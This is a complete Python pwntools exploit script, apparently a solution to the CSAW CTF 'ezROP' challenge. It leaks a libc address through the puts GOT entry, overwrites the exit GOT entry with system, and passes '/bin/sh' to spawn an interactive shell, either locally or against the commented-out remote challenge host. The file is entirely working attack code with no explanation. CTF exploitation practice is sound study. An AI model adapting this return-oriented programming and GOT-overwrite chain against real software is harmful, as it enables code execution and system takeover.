from pwn import *

libc = ELF('/usr/lib/libc.so.6', checksec=False)
elf = ELF('./ezROP', checksec=False)
p = elf.process()
# p = remote('pwn.chal.csaw.io', 5002)
pop_rdi = p64(0x00000000004015a3)
pop_rsi_r15 = p64(u64(pop_rdi) - 2)
payload = b''.join([
    b'\x00'*100 + b'\x00'*0x14,

    # leak libc    
    pop_rdi,
    p64(elf.got['puts']),
    p64(elf.sym['puts']),

    # overwrite got@exit
    pop_rsi_r15,
    p64(0x100),
    p64(0),
    pop_rdi,
    p64(elf.got['exit']),
    p64(elf.sym['readn']),

    # spawn shell
    pop_rdi,
    p64(elf.got['exit']+0x10),
    p64(elf.sym['exit']),
])
p.sendlineafter(b'?', payload)
leak = u64(p.recvline_contains(b'\x7f').ljust(8, b'\x00'))
log.info(f'leak 0x{leak:02x}')
libc.address = leak - libc.sym['puts']
log.info(f'base 0x{libc.address:02x}')

# this will overwrite got@exit
payload = b''.join([
    # got@exit
    p64(libc.sym['system']),
    # padding
    p64(0),
    # string args for rdi
    b'/bin/sh\x00'
])
p.sendline(payload)
p.interactive()